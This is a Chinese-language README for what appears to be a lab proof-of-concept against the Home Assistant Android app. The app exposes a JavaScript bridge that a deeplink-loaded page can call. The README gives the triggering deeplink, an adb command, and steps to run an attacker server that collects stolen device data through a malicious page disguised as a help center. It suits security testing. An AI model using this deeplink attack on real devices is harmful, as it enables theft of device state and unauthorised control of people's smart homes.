# EXP: 1.1 Improper Exposure of JavaScript Bridge

## 漏洞概述

Home Assistant WebView 通过 `addJavascriptInterface` 暴露了 `HomeAppBridge`，该 Bridge 包含 `getDeviceState()` 和 `sendCommand()` 方法，且未限制调用来源。攻击者通过 Deeplink 加载恶意页面即可窃取设备状态并执行未授权控制指令。

## 触发方式

```
homeassistant://webview?url=http://10.0.2.2:8000/exp/1.1
```

## 启动服务

```bash
cd exp/home-assistant/1.1_Improper_Exposure_of_JavaScript_Bridge
python server.py
```

## 文件结构

```
1.1_Improper_Exposure_of_JavaScript_Bridge/
├── server.py          # 攻击服务器（HTTP :8000）
├── exp/
│   └── 1.1.html       # 恶意页面（伪装为"设备帮助中心"）
├── received/          # 回收的数据（自动生成）
└── readme.md          # 本文件
```

## 验证步骤

1. 启动服务器: `python server.py`
2. 在模拟器中通过 adb 触发 Deeplink:
   ```
   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/1.1"
   ```
3. 观察 `received/` 目录下生成的回收数据文件
4. 检查 logcat 确认 Bridge 调用日志
